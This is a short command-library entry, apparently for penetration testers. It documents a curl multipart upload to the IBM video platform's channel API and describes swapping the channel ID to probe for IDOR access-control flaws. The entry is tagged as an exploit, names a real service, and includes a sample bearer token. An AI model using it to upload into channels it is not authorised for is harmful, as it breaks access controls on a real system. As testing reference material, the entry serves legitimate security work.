---
data: >-
  curl -X POST -H "Authorization: Bearer $TOKEN" -F "video=@$FILE"
  https://video.ibm.com/api/channels/$CHANNEL_ID/videos
tags:
  - web
  - upload
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: caf4a4b4-b741-4cff-a285-a8ed89ca7de1
created_at: '2025-12-14T17:25:34.227Z'
updated_at: '2025-12-14T17:25:34.227Z'
verified: false
validated: true
submitted: true
---
# curl-upload-video

## Command

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -F "video=@$FILE" https://video.ibm.com/api/channels/$CHANNEL_ID/videos
```

## Description

This command uses curl to perform a multipart file upload to the IBM video platform's API, targeting a specific channel ID. It is used to test or exploit upload vulnerabilities like IDOR by manipulating the $CHANNEL_ID parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Authorization: Bearer $TOKEN"` | Authentication header with JWT or API token | Yes |
| `-F "video=@$FILE"` | Uploads the file specified by $FILE path | Yes |
| `https://video.ibm.com/api/channels/$CHANNEL_ID/videos` | Endpoint URL with channel ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -F "video=@test.mp4" https://video.ibm.com/api/channels/12345/videos
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -F "video=@test.mp4" -F "title=Test Video" https://video.ibm.com/api/channels/12345/videos -v
```

## Expected Output

A successful response (HTTP 200/201) includes JSON with upload details like video ID and status: {"id": "abc123", "status": "uploaded"}. Errors may show 403 if authorization fails, but in IDOR cases, it succeeds unexpectedly.

## Related

- [[Related Procedure: Exploit-IDOR-in-Video-Upload]]
